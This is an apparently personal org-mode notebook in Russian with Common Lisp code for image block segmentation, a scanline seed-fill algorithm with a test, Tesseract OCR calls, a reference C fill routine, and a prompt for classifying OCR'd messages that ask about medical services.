  ;;   (destructuring-bind (yy-cur-right . xx-cur-right)
  ;;       cur-right-pair
  ;;     (loop for (cand-right-pair cand-left-pair) in maximin do
  ;;       (destructuring-bind (yy-cand-left . xx-cand-left)
  ;;           cand-left-pair
  ;;         (when (and (= yy-cur-right yy-cand-left)
  ;;                    (< 0 (- xx-cand-left xx-cur-right))
  ;;                    (> 3 (- xx-cand-left xx-cur-right)))
  ;;           (plot-points packflag (list cur-right-pair)  #b10000000)
  ;;           (plot-points packflag (list cand-left-pair)  #b01000000)
  ;;           (print (- xx-cand-left xx-cur-right))
  ;;           )))))



  ;; (let ((img (with-open-file (input "antalya.png" :element-type '(unsigned-byte 8))
  ;;              (png:decode input)))
  ;;       (dir  (ensure-directories-exist (format nil "./~A/"  (symbol-name (gensym)))))
  ;;       ;; (dir_ (ensure-directories-exist (format nil "./~A_/" (symbol-name (gensym)))))
  ;;       )
  ;;   (multiple-value-bind (packflag packline height width channels bit-depth)
  ;;       (conv-8x8 img)
  ;;     (let ((pf-height (ash height -3))
  ;;           (pf-width  (ash width  -3)))
  ;;       (labels ((rec-elim (candidates)
  ;;                  (if (null candidates)
  ;;                      (values)
  ;;                      ;; else
  ;;                      (let* ((candidate (car candidates))
  ;;                             (rest-of-candidates (cdr candidates))
  ;;                             (cur-fill ;; в процесе заливки сам расставляет признаки
  ;;                               (fill-8x8 candidate pf-height pf-width packflag #b10000000 t))
  ;;                             (cur-edge (edge-8x8 candidate pf-height pf-width packflag))
  ;;                             (filename (symbol-name (gensym)))
  ;;                             (filepath (format nil "~A/~A.png" dir filename))
  ;;                             (ys (mapcar #'car cur-edge))
  ;;                             (xs (mapcar #'cdr cur-edge))
  ;;                             (y-min (reduce #'min ys))
  ;;                             (x-min (reduce #'min xs))
  ;;                             (y-max (reduce #'max ys))
  ;;                             (x-max (reduce #'max xs))
  ;;                             (y-size (+ 1 (- y-max y-min)))
  ;;                             (x-size (+ 1 (- x-max x-min)))
  ;;                             (new-packflag
  ;;                               (make-array `(,pf-height ,pf-width)
  ;;                                           :element-type 'fixnum :initial-element 0))
  ;;                             (new-packline
  ;;                               (make-array `(,pf-height ,pf-width ,channels)
  ;;                                           :element-type '(unsigned-byte 8)
  ;;                                           :initial-element 0))
  ;;                             (new-img  (png:make-image (ash y-size 3) (ash x-size 3)
  ;;                                                       channels bit-depth)))
  ;;                        (format t "y-size:~A x-size:~A ~%" y-size x-size)
  ;;                        ;; Окраска точек для визуализации
  ;;                        ;; (dbgout-array cur-fill)
  ;;                        ;; (plot-points packflag cur-fill #b10000000) ;; не надо, уже окрашено
  ;;                        (plot-points packflag cur-edge #b01000000)
  ;;                        ;; new-packflag, new-packline
  ;;                        (do* ((yy 0  (+ 1 yy)))
  ;;                             ((>= yy y-size))
  ;;                          (declare (type fixnum yy))
  ;;                          (do* ((xx 0  (+ 1 xx)))
  ;;                               ((>= xx x-size))
  ;;                            (declare (type fixnum xx))
  ;;                            (setf (aref new-packflag yy xx)
  ;;                                  (aref packflag (+ yy y-min) (+ xx x-min)))
  ;;                            (dotimes (zz channels)
  ;;                              (setf (aref new-packline yy xx zz)
  ;;                                    (aref packline (+ yy y-min) (+ xx x-min) zz)))))
  ;;                        ;; new-img
  ;;                        (let ((y-start (ash y-min 3))
  ;;                              (x-start (ash x-min 3)))
  ;;                          (do* ((yy 0  (+ 1 yy)))
  ;;                               ((>= yy (ash y-size 3)))
  ;;                            (declare (type fixnum yy))
  ;;                            (do* ((xx 0 (+ 1 xx)))
  ;;                                 ((>= xx (ash x-size 3)))
  ;;                              (declare (type fixnum xx))
  ;;                              (dotimes (zz channels)
  ;;                                (setf (aref new-img yy xx zz)
  ;;                                      (aref img
  ;;                                            (+ yy y-start)
  ;;                                            (+ xx x-start)
  ;;                                            zz))))))
  ;;                        ;; ;; save img
  ;;                        ;; (with-open-file
  ;;                        ;;     (output filepath :element-type '(unsigned-byte 8)
  ;;                        ;;                      :direction :output :if-exists :supersede)
  ;;                        ;;   (png:encode new-img output))
  ;;                        ;; save pic
  ;;                        (save-packflag filepath
  ;;                                       new-packflag new-packline (ash y-size 3) (ash x-size 3)
  ;;                                       channels bit-depth new-img)
  ;;                        ;; (save-packflag (format nil "~A/~A.png" dir_ filename)
  ;;                        ;;                packflag packline height width
  ;;                        ;;                channels bit-depth img)
  ;;                        ;; ocr
  ;;                        (print (cl-tesseract:image-to-text filepath :lang "rus+eng"))
  ;;                        ;; Удаляем из списка кандидатов все точки обнаруженного
  ;;                        ;; края фигуры (cur-edge). Так как по определению края ищутся
  ;;                        ;; начиная с каждой точки-кандидата было бы избыточно удалять
  ;;                        ;; из кандидатов все точки заливки (cur-full)
  ;;                        (remove-from-candidates cur-edge rest-of-candidates)
  ;;                        ;; (print (length rest-of-candidates))
  ;;                        ;; Хвостовая рекурсия
  ;;                        (rec-elim rest-of-candidates)))))
  ;;         ;; Итерируемся по точкам-кандидатам, ища края и удаляя из
  ;;         ;; оставшихся кандидатов тех, что совпадают с найденными краями
  ;;         ;; пока кандидатов не останется. На выходе - edges
  ;;         (rec-elim (start-fig-candidates-8x8 packflag pf-height pf-width)))
  ;;       ;; dbgout: Количество фигур
  ;;       ;; (format t "~%len edges : ~A ~%" (length edges))
  ;;       ;; Выводим картинки
  ;;       ;; (save-packflag (format nil "~A/~A+.png" dir (symbol-name (gensym)))
  ;;       ;;                packflag packline height width
  ;;       ;;                channels bit-depth img)
  ;;       ;;
  ;;       )))


  ;; TODO:
  ;; слить соседние фигуры
  ;;   - сделать алгоритм слияния
  ;;   - заливка блоков
  ;; отправить в тессеракт
  ;; получить распознанные блоки и их координаты
#+END_SRC

* Fill

Построчный алгоритм заливки с затравкой. Использует пространственную когерентность:
- пиксели в строке меняются только на границах;
- при перемещении к следующей строке размер заливаемой строки скорее всего или неизменен или меняется на 1 пиксель.

Таким образом, на каждый закрашиваемый фрагмент строки в стеке хранятся координаты только одного начального пикселя, что приводит к существенному уменьшению размера стека.

Последовательность работы алгоритма для гранично определенной области следующая:

1. Координата затравки помещается в стек, затем до исчерпания стека выполняются пункты 2-4.
2. Координата очередной затравки извлекается из стека и выполняется максимально возможное закрашивание вправо и влево по строке с затравкой, т.е. пока не попадется граничный пиксел. Пусть это Х-left и Х-right, соответственно.
3. Анализируется строка ниже закрашиваемой в пределах от Х-left до Х-right и в ней находятся крайние правые пиксели всех незакрашенных фрагментов. Их координаты заносятся в стек.
4. То же самое проделывается для строки выше закрашиваемой.

#+NAME: fill_8x8
#+BEGIN_SRC lisp
  (ql:quickload "alexandria")
  (ql:quickload "cl-tesseract")

  ;; (declaim (OPTIMIZE (SPEED 3) #|(SAFETY 0)|# ))

  (defun pnt-or-nil-p (thing)
    (or (pnt-p thing)
        (null thing)))

  (deftype pnt-or-nil (&optional type)
    (declare (ignore type))
    `(satisfies pnt-or-nil-p))


  (defun fill-8x8 (cur-pnt height width packflag fill-mask &optional ret-flag)
    (declare (optimize (speed 3) (safety 0) (debug 0)))
    (declare (type fixnum width) (type fixnum height))
    (let ((stk (list (make-pnt :y (car cur-pnt) ;; Поместим первую точку в стек
                               :x (cdr cur-pnt))))
          (last-right nil)
          (res)) ;; Закрашенные точки возвращаются если ret-flag=t
      (declare (type pnt-or-nil last-right))
      (labels ((set-last-right (cur-y x-pnt)
                 (setf last-right (make-pnt :y cur-y :x x-pnt)))
               (enq (elt)
                 (push elt stk))
               (deq ()
                 (pop stk))
               (fg-pp (yy xx)
                 (declare (type fixnum yy) (type fixnum yy)
                          (ftype (function (fixnum fixnum) fixnum) fg-pp))
                 (and (>= yy 0)
                      (>= xx 0)
                      (< yy height)
                      (< xx width)
                      (not (= 0 (aref packflag yy xx)))))
               (set-fill (cur-y x-pnt)
                 (declare (type fixnum cur-y) (type fixnum x-pnt)
                          (ftype (function (fixnum fixnum)) set-fill))
                 (setf (aref packflag cur-y x-pnt)
                       (logior fill-mask
                               (aref packflag cur-y x-pnt))))
               (fill-p (cur-y x-pnt)
                 (declare (type fixnum cur-y) (type fixnum x-pnt)
                          (ftype (function (fixnum fixnum)) fill-p))
                 (not (= 0 (logand fill-mask
                                   (aref packflag cur-y x-pnt))))))
        (declare (inline set-last-right) (inline enq) (inline deq) (inline fg-pp)
                 (inline set-fill) (inline fill-p))
        (loop for cur-pnt = (deq) then (deq) always cur-pnt do
          (let ((cur-y (pnt-y cur-pnt))
                (cur-x (pnt-x cur-pnt)))
            (declare (type fixnum cur-y)  (type fixnum cur-x))
            (let ((x-left cur-x)
                  (x-right cur-x))
              (declare (type fixnum x-left)  (type fixnum x-right))
              ;; (format t "(=*_*=) cur-pnt: ~A stk: ~A ~%" cur-pnt stk)
              ;; (format t "init :: x-left: ~A | x-right: ~A ~%" x-left x-right)
              ;;
              ;; Закрасить максимальное кол-во пикселей влево от затравки,
              ;; пока не попадется граничный пиксель. Это будет координата X-left
              ;; NB: cur-x изменяется по мере продвижения влево
              ;; (format t "идем по строке влево ~%")
              (loop always (fg-pp cur-y (- x-left 1)) do
                ;; закрасить текущую точку (закрасим позже в цикле по строке)
                ;; fg-тест пройден, теперь можно сдвинуть координату X-LEFT влево
                (decf x-left))
              ;; Теперь у нас есть x-left
              ;; (format t "new x-left: ~A ~%" x-left)
              ;;
              ;; Закрасить максимальное кол-во пикселей вправо от затравки,
              ;; пока не попадется граничный пиксель. Это будет координата X-right
              ;; (format t "идем по строке вправо ~%")
              (loop always (fg-pp cur-y (+ x-right 1)) do
                ;; закрасить текущую точку (закрасим позже в цикле по строке)
                ;; fg-тест пройден, теперь можно сдвинуть координату X-RIGHT вправо
                (incf x-right))
              ;; Теперь у нас есть x-right
              ;; (format t "new x-right: ~A ~%" x-right)
              ;;
              ;; Заливка от x-left до x-right
              ;; (format t "закрашиваем - y: ~A | -от- x-left: ~A -до- x-right: ~A ~%"
              ;;         cur-y x-left x-right)
              (if ret-flag
                  (loop for x-pnt from x-left to x-right do
                    (set-fill cur-y x-pnt)
                    (push (cons cur-y x-pnt) res))
                  ;; else
                  (loop for x-pnt from x-left to x-right do
                    (set-fill cur-y x-pnt)))
              ;;
              ;; (format t "закрашены пиксели в строке ~A:" cur-y)
              ;; (print packflag)
              ;; (format t "~%")
              ;;
              ;; Проанализировать строку ниже закрашиваемой в пределах
              ;; от X-left и X-right и найти в ней крайние правые пиксели всех
              ;; незакрашенных последовательностей. Их координаты заносятся в стек
              (let ((x-left x-left) (x-right x-right))
                (setf last-right nil)
                ;; (format t ";;~%low init: last-right is nil [~A..~A] ~%" x-left x-right)
                (loop with cur-y = (+ cur-y 1)
                      for x-pnt from x-left to x-right
                      always (< cur-y height)
                      do (let* ((cur-fg (fg-pp cur-y x-pnt))
                                (prv-fg (fg-pp cur-y (- x-pnt 1)))
                                (cur-clr (when cur-fg (fill-p cur-y x-pnt))))
                           ;; (format t "low-str pnt (~A . ~A) ; fg: ~A ; clr: ~A ; prev: ~A~%"
                           ;;         cur-y x-pnt cur-fg cur-clr prv-fg)
                           (cond
                             ;; предыдущий пиксель был фоновым и этот - фоновой и не закрашен:
                             ;; ничего не делаем
                             ;; ...
                             ((and (not prv-fg) cur-fg (not cur-clr))
                              (progn
                                (set-last-right cur-y x-pnt)
                                ;; (format t "~A~A~%~A ~a~%" "предыдущий пиксель был фоновым, "
                                ;;         "а этот - тон и не закрашен:"
                                ;;         "сохраняем текущий как last-right = "
                                ;;         last-right)
                                ))
                             ((and prv-fg cur-fg (not cur-clr))
                              (progn
                                (set-last-right cur-y x-pnt)
                                ;; (format t "~A~A~%~A ~a~%" "предыдущий пиксель был тон, "
                                ;;         "и этот - тон и не закрашен:"
                                ;;         "сохраняем текущий как last-right = "
                                ;;         last-right)
                                ))
                             ((and prv-fg (not cur-fg) (not cur-clr))
                              (when last-right ;; если last-right не NIL
                                (enq last-right)
                                ;; (format t "~A~A~%~A ~a~%" "предыдущий пиксель был тон, "
                                ;;         "а этот - фон и не закрашен:"
                                ;;         "добавляем last-right в очередь :: "
                                ;;         stk)
                                ))
                             ;; предыдущий пиксель был фоновым и этот - фоновой и закрашен:
                             ;; это невозможно, фоновые пиксели не могут быть закрашены
                             ;; ...
                             ;; предыдущий пиксель был фоновым, а этот - тон и закрашен:
                             ;; ничего не делаем, пропускаем
                             ;; ...
                             ;; предыдущий пиксель был тон и этот - тон и закрашен:
                             ;; ничего не делаем, пропускаем
                             ;; ...
                             ;; предыдущий пиксель был тон а этот - фоновой и не закрашен:
                             ;; ничего не делаем, пропускаем
                             ;; ...
                             (t (setf last-right nil)))))
                (when last-right
                  (enq last-right)
                  ;; (format t "~A~A~%~A~%~a~%" "остался last-right = "
                  ;;         last-right
                  ;;         "добавляем оставшийся last-right в очередь, теперь она ="
                  ;;         stk)
                  ))
              ;; То же самое проделывается для строки выше закрашиваемой
              (let ((x-left x-left) (x-right x-right))
                (setf last-right nil)
                ;; (format t ";;~%high init: last-right is nil [~A..~A] ~%" x-left x-right)
                (loop with cur-y = (- cur-y 1)
                      for x-pnt from x-left to x-right
                      always (> cur-y 0)
                      do (let* ((cur-fg (fg-pp cur-y x-pnt))
                                (prv-fg (fg-pp cur-y (- x-pnt 1)))
                                (cur-clr (when cur-fg (fill-p cur-y x-pnt))))
                           ;; (format t "high-str pnt (~A . ~A) ; fg: ~A ; clr: ~A ; prev: ~A~%"
                           ;;         cur-y x-pnt cur-fg cur-clr prv-fg)
                           (cond
                             ;; предыдущий пиксель был фоновым и этот - фоновой и не закрашен:
                             ;; ничего не делаем
                             ;; ...
                             ((and (not prv-fg) cur-fg (not cur-clr))
                              (progn
                                (set-last-right cur-y x-pnt)
                                ;; (format t "~A~A~%~A ~a~%" "предыдущий пиксель был фоновым, "
                                ;;         "а этот - тон и не закрашен:"
                                ;;         "сохраняем текущий как last-right = "
                                ;;         last-right)
                                ))
                             ((and prv-fg cur-fg (not cur-clr))
                              (progn
                                (set-last-right cur-y x-pnt)
                                ;; (format t "~A~A~%~A ~a~%" "предыдущий пиксель был тон, "
                                ;;         "и этот - тон и не закрашен:"
                                ;;         "сохраняем текущий как last-right = "
                                ;;         last-right)
                                ))
                             ((and prv-fg (not cur-fg) (not cur-clr))
                              (when last-right ;; если last-right не NIL
                                (enq last-right)
                                ;; (format t "~A~A~%~A ~a~%" "предыдущий пиксель был тон, "
                                ;;         "а этот - фон и не закрашен:"
                                ;;         "добавляем last-right в очередь :: "
                                ;;         stk)
                                ))
                             ;; предыдущий пиксель был фоновым и этот - фоновой и закрашен:
                             ;; это невозможно, фоновые пиксели не могут быть закрашены
                             ;; ...
                             ;; предыдущий пиксель был фоновым, а этот - тон и закрашен:
                             ;; ничего не делаем, пропускаем
                             ;; ...
                             ;; предыдущий пиксель был тон и этот - тон и закрашен:
                             ;; ничего не делаем, пропускаем
                             ;; ...
                             ;; предыдущий пиксель был тон а этот - фоновой и не закрашен:
                             ;; ничего не делаем, пропускаем
                             ;; ...
                             (t (setf last-right nil)))))
                (when last-right
                  (enq last-right)
                  ;; (format t "~A~A~%~A~%~a~%" "остался last-right = "
                  ;;         last-right
                  ;;         "добавляем оставшийся last-right в очередь, теперь она ="
                  ;;         stk)
                  ))
              )
            )
              )
        )
      (if ret-flag
          (values (reverse (remove-duplicates res)))
          ;; else
          (values))))

  (defun not-so-simple-test ()
    (format t "~%~%")
    (let* ((packflag
             (alexandria:copy-array
              #2A((0 0 0 0 0 1 1 0 0 1 1)
                  (0 1 1 1 0 0 0 0 0 1 1)
                  (0 1 1 1 0 0 1 1 0 0 0)
                  (0 1 0 1 0 0 1 1 1 1 0)
                  (1 1 0 1 1 1 1 0 0 1 1)
                  (0 1 1 1 0 0 0 0 0 1 1)
                  (0 0 0 0 0 1 1 0 0 0 1)
                  (1 0 0 0 0 1 1 1 1 1 1))))
           (start-point (cons 1 2))
           (height (array-dimension packflag 0))
           (width  (array-dimension packflag 1))
           (exp-res
             (alexandria:copy-array
              #2A((0   0   0   0   0   1   1   0   0   1   1)
                  (0   129 129 129 0   0   0   0   0   1   1)
                  (0   129 129 129 0   0   129 129 0   0   0)
                  (0   129 0   129 0   0   129 129 129 129 0)
                  (129 129 0   129 129 129 129 0   0   129 129)
                  (0   129 129 129 0   0   0   0   0   129 129)
                  (0   0   0   0   0   129 129 0   0   0   129)
                  (1   0   0   0   0   129 129 129 129 129 129))))
           (points (fill-8x8 start-point height width packflag #b10000000 t))
           (result (if (equalp packflag exp-res)
                       (progn
                         (format t "::= Test passed.~%")
                         t)
                       (progn
                         (format t "::= Test failed. Expected:~%~A~%but got:~%~A~%"
                                 exp-res packflag)
                         nil))))
      (print points)
      result))

  ;; (prog1
  ;;     (not-so-simple-test)
  ;;   (finish-output))
#+END_SRC

* Tesseract

Я получил сообщение:

""аа 4%

Ребят посоветуйте пожалуйста клинику в Стамбуле, где есть
узкие специалисты Д. Д.Д.

У меня боли в районе челюстного сустава, не могу свободно
двигать челюстью У
"

Если в этом сообщении пользователь НЕ спрашивает о медицинских услугах, ответь одним словом "НЕТ" и закончи ответ.

Если в этом сообщении пользователь задает вопрос о медицинской помощи, ответь "ДА" и продолжи ответ на следующей строке. Далее будут несколько правил, согласно которым ты должен составить ответ. После исполнения каждого правила продолжай на следующей строке.

Если из сообщения можно понять, помощь какого врача требуется, добавь в ответ указание на врача, например "Врач: ортопед" (если нужен именно ортопед). Если понять нельзя, ответь "Врач: неопределен".

Если из сообщения можно понять, где территориально нужна помощь врача, добавь к ответу "Место: Анталия", где вместо "Анталия" будет место где пользователю нужна медицинская услуга. Иначе ответь "Место: неопределено"

Если пользователь спрашивает о ценах на медицинские процедуры, добавь к ответ "Цены: нужны"

Если пользователь спрашивает сколько займут времени мединские процедуры, добавь к ответу "Время: нужно".

Таким образом ответ должен представлять несколько строчек, в каждой из которых два слова, разделенные двоеточием

#+BEGIN_SRC lisp
  (ql:quickload :cl-tesseract)

  (cl-tesseract:image-to-text #P"demo/artem.png" :lang "rus+eng")
#+END_SRC

* Profiling

#+BEGIN_SRC lisp
  ;; (require :sb-sprof)

  ;; (sb-sprof:profile-call-counts "CL-USER")

  ;; (sb-sprof:with-profiling (:max-samples 1000
  ;;                           :report :flat
  ;;                           :mode :time
  ;;                           :loop t)
  ;;   (launcher))

  ;; (ql:quickload :tracer)

  ;; (progn
  ;;   (tracer:with-tracing ("CL-USER")
  ;;     (launcher))
  ;;   (tracer:save-report "/home/rigidus/src/survey/report.json"))
#+END_SRC

** Reference fill

http://algolist.ru/graphics/fill.php

#+BEGIN_SRC c
  /*----------------------------------------------------- V_FAST
   ,* Подпрограммы заливки области с затравкой
   ,* построчным алгоритмом:
   ,*
   ,* Pop_Stk   - Локальная подпрограмма. Извлекает координаты
   ,*             пиксела из стека в глобальные скаляры xtek,ytek
   ,*
   ,* Push_Stk  - Локальная подпрограмма. Заносит координаты
   ,*             пиксела в стек
   ,*
   ,* Get_Video - Локальная подпрограмма. Читает строку из
   ,*             видеопамяти в глобальный буфер строки.
   ,*
   ,* Put_Video - Локальная подпрограмма. Копирует байты из
   ,*             глобального буфера строки в видеопамять.
   ,*
   ,* Search    - Локальная подпрограмма. Ищет затравочные
   ,*             пикселы в строке видеопамяти, находящейся
   ,*             в глобальном массиве.
   ,*
   ,* V_FAST    - Собственно подпрограмма построчной заливки
   ,*             гранично-определенной области
   ,*
   ,* V_FA_SET  - Устанавливает количественные ограничения
   ,*            для заливки
   ,*/

  #include <alloc.h>
  #include <graphics.h>
  #include <stdio.h>

  #define MAX_GOR 2048  /* Разрешение дисплея по X */
  #define MAX_VER 2048  /* Разрешение дисплея по Y */
  #define MAX_STK 8192  /* Размер стека координат заливки */

  static int gor_max= MAX_GOR;
  static int ver_max= MAX_VER;
  static int stk_max= MAX_STK;
  static int *pi_stk, *pn_stk;   /* Указ  стека заливки */
  static int xtek, ytek;         /* Координаты из стека */
  static char *pc_video;         /* Указ на буфер строки */
  static int stklen;             /* Достигнутая глубина стека*/
                                 /* только для отладочных    */
                                 /* измерений программы      */


  /*---------------------------------------------------- Pop_Stk
   ,* Извлекает координаты пиксела из стека в xtek, ytek
   ,* Возвращает 0/1 - нет/есть ошибки
   ,*/
  static int  Pop_Stk ()
  {  register int  otw;
      otw= 0;
      if (pi_stk <= pn_stk) ++otw; else {
          ytek= *--pi_stk;  xtek= *--pi_stk;
      }
      return (otw);
  }  /* Pop_Stk */

  /*--------------------------------------------------- Push_Stk
   ,* Заносит координаты пиксела в стек
   ,* Возвращает -1/0 - нет места под стек/норма
   ,*/
  static int  Push_Stk (x, y)
      register int x, y;
  {
      register int glu;
      if ((glu= pi_stk - pn_stk) >= stk_max) x= -1; else {
          ,*pi_stk++= x;  *pi_stk++= y; x= 0;
          if (glu > stklen) stklen= glu;
      }
      return (x);
  }  /* Push_Stk */

  /*-------------------------------------------------- Get_Video
   ,* В байтовый буфер строки, заданный глобальным
   ,* указателем pc_video,
   ,* читает из видеопамяти пикселы y-строки от xbg до xen
   ,* Возвращает 0/1 - нет/есть ошибки
   ,*/
  static int  Get_Video (y, pcxbg, pcxen)
  int y;  register char *pcxbg, *pcxen;
  {  register int x;

      if (y>=0 && y<ver_max && pcxbg<=pcxen) {
          x= pcxbg - pc_video;
          do *pcxbg++= getpixel (x++, y); while (pcxbg <= pcxen);
          y= 0;
      } else y= 1;
      return (y);
  }  /* Get_Video */

  /*-------------------------------------------------- Put_Video
   ,* Пикселы из буфера строки, начиная от указателя pxbg,
   ,* до указателя pxen пишет в y-строку видеопамяти
   ,* Возвращает 0/1 - нет/есть ошибки
   ,*/
  static int  Put_Video (y, pxbg, pxen)
  int y;  register char *pxbg, *pxen;
  {  register int  x;
      if (y>=0 && y<ver_max && pxbg<=pxen) {
          x= pxbg - pc_video;
          do putpixel (x++, y, *pxbg++); while (pxbg <= pxen);
          y= 0;
      } else y= 1;
      return (y);
  }  /* Put_Video */

  /*----------------------------------------------------- Search
   ,* Ищет затравочные пикселы в yt-строке видеопамяти,
   ,* находящейся по указателю pc_video, начиная от
   ,* указателя pcl до указателя pcr
   ,* grn - код граничного пиксела
   ,* new - код, которым перекрашивается область
   ,* Возвращает: 0/1 - не найден/найден затравочный
   ,*/
  static int  Search (yt, pcl, pcr, grn, new)
  int yt;  char *pcl, *pcr;  int grn, new;
  {  register int pix;
      register char *pc;
      int x, otw;

      otw= 0;
      while (pcl <= pcr) {
          pc= pcl;                          /* Указ тек пиксела */
  /* Поиск крайнего правого не закрашенного пиксела в строке */
          while ((pix= *pc & 255) != grn && pix != new && pc<pcr)
              ++pc;

          if (pc != pcl) {          /* Найден закрашиваемый */
              ++otw;
              x= pc - pc_video;      /* Его координата в строке */
              if (pc != pcr || pix == grn || pix == new) --x;
              Push_Stk (x, yt);
          }
  /* Продолжение анализа строки пока не достигнут прав пиксел */
          pcl= pc;
          while (((pix= *pc & 255) == grn || pix==new) && pc<pcr)
              ++pc;
          if (pc == pcl) ++pc;
          pcl= pc;
      }
      return (otw);
  }  /* Search */


  /*----------------------------------------------------- V_FAST
   ,* Построчная заливка с затравкой гранично-определенной
   ,* области
   ,*
   ,* int V_FAST (int grn_pix, int new_pix, int x_isx, int y_isx)
   ,*
   ,* Вход:
   ,* grn_pix - код граничного пиксела
   ,* new_pix - код заполняющего пиксела
   ,* x_isx   - координаты затравки
   ,* y_isx
   ,*
   ,* Возвращает:
   ,* -2 - нет места под растровую строку
   ,* -1 - нет места под стек
   ,*  0 - норма
   ,*  1 - при чтении пикселов из видеопамяти в буферную
   ,*      строки выход за пределы буферной строки
   ,*  2 - исчерпан стек при запросе координат пикселов
   ,*
   ,*/
  int V_FAST (grn_pix, new_pix, x_isx, y_isx)
      int grn_pix, new_pix, x_isx, y_isx;
  {
      register char *pcl;    /* Указ левого  пиксела в строке */
      register char *pcr;    /* Указ правого пиксела в строке */
      int  otw;

      otw= 0;

  /* Инициализация стека */
      if ((pn_stk= (int *)malloc (stk_max)) == NULL) {
          --otw;  goto all;
      }
      pi_stk= pn_stk;

  /* Заказ массива под растровую строку */
      if ((pc_video= malloc (gor_max)) == NULL) {
          otw= -2;  goto fre_stk;
      }

      Push_Stk (x_isx, y_isx);     /* Затравку в стек */

  /* Цикл заливки строк до исчерпания стека */

      while (pi_stk > pn_stk) {

  /* Запрос координат затравки из стека */
          if (Pop_Stk ()) {otw=2; break; }
          pcl= pcr= pc_video + xtek;   /* Указ затравки */

  /* Запрос полной строки из видеопамяти */
          if (Get_Video (ytek, pc_video, pc_video+gor_max-1))
          {otw= 1;  break; }

  /* Закраска затравки и вправо от нее */
          do *pcr++= new_pix; while ((*pcr & 255) != grn_pix);
          --pcr;                    /* Указ крайнего правого */

  /* Закраска влево */
          while ((*--pcl & 255) != grn_pix) *pcl= new_pix;
          ++pcl;                    /* Указ крайнего левого */

  /* Занесение подправленной строки в видеопамять */
          Put_Video (ytek, pcl, pcr);

  /* Поиск затравок в строках ytek+1 и ytek-1,
   ,* начиная с левого подинтервала, заданного pcl, до
   ,* правого подинтервала, заданного pcr
   ,*/
          if (!Get_Video (++ytek, pcl, pcr))
              Search (ytek, pcl, pcr, grn_pix, new_pix);

          if (!Get_Video (ytek-= 2, pcl, pcr))
              Search (ytek, pcl, pcr, grn_pix, new_pix);
      }
      free (pc_video);
  fre_stk:
      free (pn_stk);
  all:
      return (otw);
  }  /* V_FAST */


  /*--------------------------------------------------- V_FA_SET
   ,* Устанавливает количественные ограничения для заливки
   ,*/
  void V_FA_SET (x_resolution, y_resolution, stack_length)
      int  x_resolution, y_resolution, stack_length;
  {
      if (x_resolution > 0 && x_resolution <= MAX_GOR)
          gor_max= x_resolution;
      if (y_resolution > 0 && y_resolution <= MAX_VER)
          ver_max= y_resolution;
  /* Кол байт координат, заносимых в стек м.б. только четным */
      if (stack_length > 0) stk_max= stack_length & 0177776;
  }  /* V_FA_SET */







  /*-------------------------------------------------- FAST_MAIN
   ,*/
  void main (void)
  {
      int   ii, kol, grn, new, entry;
      int   x_isx, y_isx;
      int   gdriver = DETECT, gmode;
      int   Px[256] = {200,200,250,270,270,210,210,230,230};
      int   Py[256] = {200,250,250,230,200,210,230,230,210};

      kol= 5;              /* Кол-во вершин        */
      grn= 11;             /* Код пикселов границы */
      new= 14;             /* Код заливки          */
      x_isx= 240;          /* Координаты затравки  */
      y_isx= 240;
      entry= 0;

      initgraph(&gdriver, &gmode, "c:\tc\bgi");
      if ((ii= graphresult()) != grOk) {
          printf ("Err=%d\n", ii); goto all;
      }

  m0:goto m2;
  m1:++entry;
      printf("Vertexs, boundary_pixel, new_pixel= (%d %d %d) ? ",
             kol, grn, new);
      scanf ("%d%d%d", &kol, &grn, &new);
      if (kol < 0) goto all;

      for (ii=0; ii<kol; ++ii) {
          printf ("Px[%d], Py[%d] = ? ", ii, ii);
          scanf  ("%d%d", &Px[ii], &Py[ii]);
      }

      printf ("X,Y isx= (%d %d) ? ", x_isx, y_isx);
      scanf ("%d%d", &x_isx, &y_isx);

  m2:
      setbkcolor(0);
      cleardevice();

  /* Построение границы */
      setcolor (grn);
      for (ii= 0; ii<kol-1; ++ii)
          line (Px[ii], Py[ii], Px[ii+1], Py[ii+1]);
      line (Px[kol-1], Py[kol-1], Px[0], Py[0]);

  /* При первом входе строится квадратик дырки */
      if (!entry) {
          for (ii= kol; ii<kol+3; ++ii)
              line (Px[ii], Py[ii], Px[ii+1], Py[ii+1]);
          line (Px[kol+3], Py[kol+3], Px[kol], Py[kol]);
      }

  /* Установка количественных ограничений для проц заливки */
      V_FA_SET (getmaxx()+1, getmaxy()+1, MAX_STK);

      stklen= 0;           /* Занятое кол-во байт в стеке */

  /* Заливка */
      ii= V_FAST (grn, new, x_isx, y_isx);
      printf ("Answer= %d MaxStack=%d\n", ii, stklen);
      goto m1;

  all:
      closegraph();
  }

#+END_SRC

* Dbg assembly

#+BEGIN_SRC lisp :tangle ./run.lisp :noweb yes :exports code
  <<x_snapshot>>

  <<conv_8x8>>

  <<re_conv_8x8>>

  <<edge_8x8>>

  <<fill_8x8>>

  <<launcher>>
#+END_SRC

* Supercompile

#+BEGIN_SRC lisp
  (defun supercompile (expr)
    (cond ((and (atom expr)
                (not (numberp expr)))
           (progn
             (format t "::expr: ~A~%" expr)
             expr))
          ((eq (car expr) 'factorial)
           (progn
             (format t "::factorial~%" expr)
             (let ((n (cadr expr)))
               (if (integerp n)
                   (let ((result 1))
                     (do ((i 1 (+ i 1)))
                         ((> i n) result)
                       (setf result (* result i))))
                   ;; else
                   `(* ,(supercompile n)
                       (factorial (- ,n 1)))))))
          (t (progn
               (format t "::recur: ~A~%" expr)
               (cons (supercompile (car expr))
                     (supercompile (cdr expr)))))))

  (defun factorial (n)
    (if (<= n 1)
        1
        (* n (factorial (- n 1)))))

  (factorial (factorial 5))

  (defun factorial-sup (n)
    (eval (supercompile `(factorial (factorial 5)))))

  (supercompile `(factorial (factorial 5)))

  (equal (factorial-sup 5)
         (factorial 5))

  (trace supercompile)
#+END_SRC

* TODO Cutting

Можно ли автоматически сгенерировать по этой картинке программу на форте, которая будет форкаться для того чтобы как можно быстрее воспроизвести в точности такое изображение?

Имея на входе "точки затравки" и поток байт, который управляет в каком направлении будут расти серые участки?

Я думаю о том чтобы включить в виртуальную форт-машину команды fork и exit

И над алгоритмом, который оптимальным способом построит программу для построение картинки

Еще я думаю о том, что при выполнении таких форкнутых программ мы фактически получаем ветвящееся дерево стеков, а вот входные данные - это единый поток команд для всех форкнутых кусков, просто они делают из него выборку команд каждый в своем слайсе, пока не наткнуться на exit

#+BEGIN_SRC lisp
  ;; DBG & PROFILING

  (copy-png "x-snapshot-true-color-telegram.png" "copy.png")

  (compile 'copy-png)

  (dotimes (aa 100)
    (time
     (copy-png "x-snapshot-true-color.png" "aaaaa.png")
     ))

  ;; (disassemble #'copy-png)

  ;; (require :sb-sprof)

